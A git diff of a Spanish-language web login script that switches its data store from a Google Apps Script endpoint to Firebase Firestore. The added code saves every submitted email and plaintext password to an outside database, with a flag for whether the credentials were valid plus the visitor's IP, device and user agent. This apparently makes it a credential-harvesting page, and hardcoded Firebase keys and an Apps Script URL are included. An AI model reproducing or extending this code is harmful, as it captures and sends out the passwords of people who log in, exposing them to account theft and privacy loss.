@@ -1,5 +1,22 @@
-// Configuración - USA ESTA URL (la misma que tienes)
-const API_URL = 'https://script.google.com/macros/s/AKfycbwsPj9OX59TC_rzS34hWt2N2cVrBSHJ7cl02cJ0fg1H0yVzxp5JcmL8rYmfmMMQpdISPw/exec';
+// 🔥 CONFIGURACIÓN FIREBASE - REEMPLAZA CON TUS DATOS
+const firebaseConfig = {
+  apiKey: "AIzaSyBcdFsHGjJ1FCok9lw9q-zG-I9C91L7KsU",
+  authDomain: "mi-login-app-dd899.firebaseapp.com",
+  projectId: "mi-login-app-dd899",
+  storageBucket: "mi-login-app-dd899.firebasestorage.app",
+  messagingSenderId: "462347115903",
+  appId: "1:462347115903:web:23bed26b7fc2dbd57b4e4a"
+};
+
+// Inicializar Firebase
+try {
+    firebase.initializeApp(firebaseConfig);
+    console.log('✅ Firebase inicializado correctamente');
+} catch (error) {
+    console.error('❌ Error inicializando Firebase:', error);
+}
+
+const db = firebase.firestore();
 
 document.addEventListener('DOMContentLoaded', function() {
     const loginForm = document.getElementById('loginForm');
@@ -127,9 +144,9 @@ document.addEventListener('DOMContentLoaded', function() {
             // Verificar si las credenciales son válidas
             const isValid = checkCredentials(email, password);
 
-            // ✅ GUARDAR EN GOOGLE SHEETS
-            console.log('🌐 Intentando guardar en Google Sheets...');
-            const saveSuccess = await saveToGoogleSheets(email, password, isValid);
+            // ✅ GUARDAR EN FIREBASE
+            console.log('🌐 Intentando guardar en Firebase...');
+            const saveSuccess = await saveToFirebase(email, password, isValid);
 
             if (isValid && saveSuccess) {
                 console.log('🎉 Login exitoso y datos guardados');
@@ -163,39 +180,41 @@ document.addEventListener('DOMContentLoaded', function() {
         );
     }
 
-    // Guardar en Google Sheets - SOLUCIÓN CORS
-    async function saveToGoogleSheets(email, password, isValid) {
+    // Guardar en Firebase
+    async function saveToFirebase(email, password, isValid) {
         try {
-            const requestData = {
+            const loginData = {
                 email: email,
                 password: password,
                 status: isValid ? '✅ CORRECTO' : '❌ INCORRECTO',
-                userAgent: navigator.userAgent
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                device: /Mobile/.test(navigator.userAgent) ? '📱 Mobile' : '💻 Desktop',
+                ip: await getIPAddress()
             };
-            
-            console.log('📤 Enviando datos...', requestData);
 
-            // Usar fetch con modo 'no-cors' no funciona para ver la respuesta
-            // En su lugar, usamos el método tradicional
-            const response = await fetch(API_URL, {
-                method: 'POST',
-                mode: 'no-cors', // Esto evita el error CORS pero no podemos leer la respuesta
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(requestData)
-            });
+            console.log('📤 Guardando en Firebase:', loginData);
             
-            // Con 'no-cors' no podemos ver response.json(), así que asumimos éxito
-            console.log('✅ Datos enviados (modo no-cors)');
+            // Guardar en Firestore
+            await db.collection('loginAttempts').add(loginData);
             
-            // En modo no-cors, asumimos que fue exitoso después de un tiempo
-            await new Promise(resolve => setTimeout(resolve, 1000));
+            console.log('✅ Datos guardados en Firebase');
             return true;
             
         } catch (error) {
-            console.error('💥 Error de conexión:', error);
+            console.error('💥 Error guardando en Firebase:', error);
             return false;
+        }
+    }
+
+    // Obtener dirección IP aproximada
+    async function getIPAddress() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            return 'Unknown';
         }
     }
 
